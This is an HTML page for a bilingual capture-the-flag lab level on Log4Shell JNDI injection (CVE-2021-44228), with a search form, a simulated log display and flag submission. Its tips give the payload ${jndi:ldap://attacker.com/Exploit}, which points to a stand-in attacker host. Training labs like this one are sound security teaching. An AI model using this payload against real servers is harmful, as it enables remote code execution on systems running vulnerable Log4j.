<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log4Shell JNDI Injection</title>
    <link rel="stylesheet" href="/css/vuln-types.css">
    <style>
        :root {
            --color-bg-dark: #0a0a0a;
            --color-text-primary: #f5f5f5;
            --color-text-secondary: #9a9a9a;
            --color-gold: #d4af37;
            --color-gold-light: #f4cf57;
            --color-gold-dark: #b4941f;
            --color-success: #22c55e;
            --color-danger: #ff2a2a;
            --font-display: "Georgia", serif;
            --font-body: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
            --spacing-xs: 0.5rem;
            --spacing-sm: 1rem;
            --spacing-md: 1.5rem;
            --spacing-lg: 2rem;
            --spacing-xl: 3rem;
        }
        * { box-sizing: border-box; }
        body { margin: 0; padding: var(--spacing-lg); background: transparent; color: var(--color-text-primary); font-family: var(--font-body); min-height: 100vh; }
        .header-section { display: flex; justify-content: space-between; align-items: center; flex-wrap: nowrap; gap: var(--spacing-md); padding-bottom: var(--spacing-lg); margin-bottom: var(--spacing-lg); border-bottom: 1px solid transparent; background: linear-gradient(to bottom, transparent calc(100% - 1px), rgba(212, 175, 55, 0.4) calc(100% - 1px), rgba(212, 175, 55, 0.1) 100%) bottom / 100% 1px no-repeat; }
        .level-content h1 { font-family: var(--font-display); font-size: clamp(1rem, 3vw, 1.8rem); font-weight: 600; color: var(--color-gold); margin: 0; white-space: nowrap; flex-shrink: 0; }
        .flag-submit-form { display: flex; gap: 8px; align-items: center; flex-shrink: 0; }
        .flag-input-inline { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(212, 175, 55, 0.3); border-radius: 4px; padding: 8px 12px; color: var(--color-text-primary); font-family: 'Courier New', monospace; font-size: 0.85rem; width: 180px; }
        .flag-input-inline:focus { outline: none; border-color: var(--color-gold); }
        .flag-submit-btn-small { background: linear-gradient(135deg, var(--color-gold), var(--color-gold-dark)); color: var(--color-bg-dark); border: none; border-radius: 4px; padding: 8px 16px; font-weight: 600; cursor: pointer; font-size: 0.85rem; }
        .flag-submit-btn-small:hover { background: linear-gradient(135deg, var(--color-gold-light), var(--color-gold)); }
        .flag-message-inline { font-size: 0.8rem; margin-left: 8px; }
        .flag-message-inline.success { color: var(--color-success); }
        .flag-message-inline.error { color: var(--color-danger); }

        .challenge-container { background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(212, 175, 55, 0.25); border-radius: 6px; padding: 1.5rem; max-width: 750px; margin: 0 auto; }
        .info-box { background: rgba(0, 0, 0, 0.3); border-radius: 6px; padding: var(--spacing-md); margin-bottom: var(--spacing-lg); }
        .info-box h3 { color: var(--color-gold); margin: 0 0 var(--spacing-sm) 0; font-size: 0.9rem; }
        .info-code { background: rgba(0, 0, 0, 0.5); border-radius: 4px; padding: var(--spacing-sm); font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--color-gold-light); white-space: pre-wrap; overflow-x: auto; }

        .form-group { margin-bottom: var(--spacing-md); }
        .form-group label { display: block; font-size: 0.9rem; color: var(--color-gold); font-weight: 500; margin-bottom: 8px; }
        .search-input { width: 100%; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(212, 175, 55, 0.3); border-radius: 4px; padding: var(--spacing-sm); color: var(--color-text-primary); font-family: var(--font-body); font-size: 1rem; }
        .search-input:focus { outline: none; border-color: var(--color-gold); }
        .action-btn { width: 100%; background: linear-gradient(135deg, var(--color-gold), var(--color-gold-dark)); color: var(--color-bg-dark); border: none; border-radius: 4px; padding: 12px 24px; font-weight: 600; cursor: pointer; font-size: 1rem; margin-top: var(--spacing-sm); }
        .action-btn:hover { background: linear-gradient(135deg, var(--color-gold-light), var(--color-gold)); }
        .secondary-btn { background: rgba(212, 175, 55, 0.15); color: var(--color-gold); border: 1px solid rgba(212, 175, 55, 0.3); border-radius: 4px; padding: 10px 20px; font-weight: 500; cursor: pointer; font-size: 0.9rem; margin-bottom: var(--spacing-md); }
        .secondary-btn:hover { background: rgba(212, 175, 55, 0.25); }

        .result-box { margin-top: var(--spacing-md); padding: var(--spacing-md); background: rgba(0, 0, 0, 0.2); border-radius: 6px; display: none; }
        .result-box h4 { color: var(--color-gold); margin: 0 0 var(--spacing-sm) 0; }
        .result-content { font-family: 'Courier New', monospace; font-size: 0.8rem; white-space: pre-wrap; word-break: break-all; }

        .feedback { margin-top: var(--spacing-md); padding: var(--spacing-sm); border-radius: 4px; font-size: 0.9rem; text-align: center; min-height: 1.5em; }
        .feedback.success { background: rgba(34, 197, 94, 0.15); color: var(--color-success); border: 1px solid rgba(34, 197, 94, 0.25); }
        .feedback.error { background: rgba(255, 42, 42, 0.15); color: var(--color-danger); border: 1px solid rgba(255, 42, 42, 0.25); }

        .tips-box { margin-top: var(--spacing-xl); padding: var(--spacing-md); background: rgba(212, 175, 55, 0.05); border-left: 3px solid var(--color-gold); border-radius: 4px; }
        .tips-box h3 { color: var(--color-gold); margin-bottom: var(--spacing-sm); font-family: var(--font-display); }
        .tips-box ul { margin-left: var(--spacing-md); color: var(--color-text-secondary); line-height: 1.8; }
        .tips-box li { margin-bottom: 6px; }
        .tips-box code { background: rgba(0, 0, 0, 0.3); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; color: var(--color-gold-light); }

        .log-display { background: rgba(0, 0, 0, 0.5); border-radius: 4px; padding: var(--spacing-sm); margin-top: var(--spacing-sm); font-family: 'Courier New', monospace; font-size: 0.75rem; color: #88cc88; max-height: 100px; overflow-y: auto; display: none; }
    </style>
</head>
<body>
    <div class="level-content">
        <div class="header-section">
            <h1 id="page-title" data-i18n="log4shell.title">Log4Shell JNDI注入</h1>
            <div class="flag-submit-form">
                <input type="text" id="flag-input" class="flag-input-inline" data-i18n-placeholder="log4shell.flagPlaceholder" placeholder="输入 Flag..." autocomplete="off" />
                <button id="flag-submit-btn" class="flag-submit-btn-small" data-i18n="log4shell.submit">提交</button>
                <span id="flag-message" class="flag-message-inline"></span>
            </div>
        </div>

        <div class="challenge-container">
            <div class="info-box">
                <h3 data-i18n="log4shell.appInfoTitle">应用信息</h3>
                <div id="app-info" class="info-code">Loading...</div>
            </div>

            <button id="get-info-btn" class="secondary-btn" data-i18n="log4shell.getInfo">查看应用信息</button>

            <div class="form-group">
                <label data-i18n="log4shell.searchLabel">搜索关键词</label>
                <input type="text" id="search-input" class="search-input" placeholder="Enter search keyword..." />
            </div>

            <button id="search-btn" class="action-btn" data-i18n="log4shell.searchBtn">搜索</button>

            <div id="log-display" class="log-display"></div>

            <div id="result-box" class="result-box">
                <h4 data-i18n="log4shell.result">搜索结果</h4>
                <div id="result-content" class="result-content"></div>
            </div>
            <div id="feedback" class="feedback"></div>
        </div>

        <div class="tips-box">
            <h3 data-i18n="log4shell.tips">提示</h3>
            <ul>
                <li data-i18n="log4shell.tip1">查看应用信息，注意日志框架版本</li>
                <li data-i18n="log4shell.tip2">Log4j2 会解析日志消息中的 ${...} 表达式</li>
                <li><span data-i18n="log4shell.tip3">尝试在搜索框输入</span> <code>${jndi:ldap://attacker.com/Exploit}</code></li>
                <li data-i18n="log4shell.tip4">CVE-2021-44228: Log4j2 的 JNDI Lookup 导致远程代码执行</li>
            </ul>
        </div>
    </div>

    <script src="/js/config.js"></script>
    <script src="/js/i18n-config.js"></script>
    <script src="/js/i18n-manager.js"></script>
    <script>
        const i18n = {
            'zh-CN': {
                'log4shell.title': 'Log4Shell JNDI注入 - 搜索功能',
                'log4shell.flagPlaceholder': '输入 Flag...',
                'log4shell.submit': '提交',
                'log4shell.appInfoTitle': '应用信息',
                'log4shell.getInfo': '查看应用信息',
                'log4shell.searchLabel': '搜索关键词',
                'log4shell.searchBtn': '搜索',
                'log4shell.result': '搜索结果',
                'log4shell.tips': '提示',
                'log4shell.tip1': '查看应用信息，注意日志框架版本',
                'log4shell.tip2': 'Log4j2 会解析日志消息中的 ${...} 表达式',
                'log4shell.tip3': '尝试在搜索框输入',
                'log4shell.tip4': 'CVE-2021-44228: Log4j2 的 JNDI Lookup 导致远程代码执行',
                'log4shell.congrats': '恭喜！Log4Shell JNDI注入关卡完成！',
                'log4shell.enterFlag': '请输入 Flag',
                'log4shell.flagError': 'Flag 不正确',
                'log4shell.networkError': '网络错误，请稍后再试'
            },
            'en-US': {
                'log4shell.title': 'Log4Shell JNDI Injection - Search',
                'log4shell.flagPlaceholder': 'Enter Flag...',
                'log4shell.submit': 'Submit',
                'log4shell.appInfoTitle': 'Application Info',
                'log4shell.getInfo': 'View App Info',
                'log4shell.searchLabel': 'Search Keyword',
                'log4shell.searchBtn': 'Search',
                'log4shell.result': 'Search Results',
                'log4shell.tips': 'Tips',
                'log4shell.tip1': 'Check application info - note the logging framework version',
                'log4shell.tip2': 'Log4j2 resolves ${...} expressions in log messages',
                'log4shell.tip3': 'Try entering in the search box:',
                'log4shell.tip4': 'CVE-2021-44228: Log4j2 JNDI Lookup leads to Remote Code Execution',
                'log4shell.congrats': 'Congratulations! Log4Shell JNDI Injection challenge completed!',
                'log4shell.enterFlag': 'Please enter Flag',
                'log4shell.flagError': 'Incorrect flag',
                'log4shell.networkError': 'Network error, please try again later'
            }
        };

        function getLang() { return localStorage.getItem('lang') || 'en-US'; }
        function t(key) { const lang = getLang(); return i18n[lang] && i18n[lang][key] ? i18n[lang][key] : key; }
        function showFeedback(type, message) { const el = document.getElementById('feedback'); el.className = 'feedback ' + type; el.textContent = message; }

        async function init() {
            bindEvents();
            applyLanguage();
            fetchInfo();
            window.addEventListener('languageChanged', applyLanguage);
            window.addEventListener('message', function(event) {
                if (event.data && event.data.type === 'languageChanged') {
                    localStorage.setItem('lang', event.data.language);
                    applyLanguage();
                }
            });
        }

        function applyLanguage() {
            const lang = getLang();
            document.documentElement.lang = lang;
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (i18n[lang] && i18n[lang][key]) el.textContent = i18n[lang][key];
            });
            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                const key = el.getAttribute('data-i18n-placeholder');
                if (i18n[lang] && i18n[lang][key]) el.placeholder = i18n[lang][key];
            });
        }

        function bindEvents() {
            document.getElementById('get-info-btn').addEventListener('click', fetchInfo);
            document.getElementById('search-btn').addEventListener('click', handleSearch);
            document.getElementById('search-input').addEventListener('keypress', e => { if (e.key === 'Enter') handleSearch(); });
            document.getElementById('flag-submit-btn').addEventListener('click', handleSubmitFlag);
            document.getElementById('flag-input').addEventListener('keypress', e => { if (e.key === 'Enter') handleSubmitFlag(); });
        }

        async function fetchInfo() {
            try {
                const response = await fetch('/api/challenge/deser/log4shell/info');
                const data = await response.json();
                if (data.success) {
                    document.getElementById('app-info').textContent = JSON.stringify(data.appInfo, null, 2);
                }
            } catch (error) {
                document.getElementById('app-info').textContent = 'Error loading app info';
            }
        }

        async function handleSearch() {
            const keyword = document.getElementById('search-input').value.trim();
            if (!keyword) { showFeedback('error', 'Please enter a search keyword'); return; }

            // Show simulated log output
            const logDisplay = document.getElementById('log-display');
            logDisplay.style.display = 'block';
            const timestamp = new Date().toISOString();
            logDisplay.innerHTML += `<div>[${timestamp}] INFO  SearchController - User searched for: ${keyword.replace(/</g, '&lt;')}</div>`;

            try {
                const response = await fetch('/api/challenge/deser/log4shell/search', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ keyword: keyword })
                });
                const result = await response.json();

                document.getElementById('result-box').style.display = 'block';
                document.getElementById('result-content').textContent = JSON.stringify(result, null, 2);

                if (result.log4shell_triggered) {
                    logDisplay.innerHTML += `<div style="color: #ff4444;">[${new Date().toISOString()}] CRITICAL - JNDI lookup triggered! Remote class loading from attacker server...</div>`;
                    showFeedback('success', result.message);
                } else if (result.success) {
                    showFeedback('success', result.message + (result.hint ? '\n' + result.hint : ''));
                } else {
                    showFeedback('error', result.message);
                }
            } catch (error) { showFeedback('error', t('log4shell.networkError')); }
        }

        async function handleSubmitFlag() {
            const submittedFlag = document.getElementById('flag-input').value.trim();
            const flagMessage = document.getElementById('flag-message');
            if (!submittedFlag) { flagMessage.className = 'flag-message-inline error'; flagMessage.textContent = t('log4shell.enterFlag'); return; }
            try {
                const response = await fetch('/api/challenge/flag_check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ vul_type: 'deserialization', vul_level: 'level3', flag: submittedFlag })
                });
                const result = await response.json();
                if (result.success) {
                    flagMessage.className = 'flag-message-inline success';
                    flagMessage.textContent = t('log4shell.congrats');
                    if (window.parent !== window) {
                        window.parent.postMessage({ type: 'challengeCompleted', vulnType: 'deserialization', level: 'level3' }, '*');
                    }
                } else {
                    flagMessage.className = 'flag-message-inline error';
                    flagMessage.textContent = result.message || t('log4shell.flagError');
                }
            } catch (error) { flagMessage.className = 'flag-message-inline error'; flagMessage.textContent = t('log4shell.networkError'); }
        }

        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
